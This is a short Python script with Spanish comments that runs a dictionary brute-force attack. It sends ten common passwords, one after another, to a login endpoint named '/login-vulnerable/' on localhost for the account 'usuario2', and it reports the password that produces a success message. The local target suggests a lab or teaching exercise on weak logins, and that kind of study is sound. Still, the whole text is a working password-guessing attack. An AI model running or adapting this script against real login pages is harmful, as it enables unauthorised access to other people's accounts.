import requests

url = "http://127.0.0.1:8000/login-vulnerable/"
usuario = "usuario2"

# Diccionario de contraseñas a probar
passwords = [
    "1234", "12345", "password", "admin", "test",
    "usuario2", "qwerty", "abc123", "letmein", "123456"
]

print(f"🎯 Atacando usuario: {usuario}")
print(f"📋 Probando {len(passwords)} contraseñas...\n")

for pwd in passwords:
    r = requests.post(url, data={
        "username": usuario,
        "password": pwd
    })
    if "ÉXITO" in r.text:
        print(f"✅ CONTRASEÑA ENCONTRADA: {pwd}")
        break
    else:
        print(f"❌ Fallida: {pwd}")

print("\n✅ Ataque finalizado.")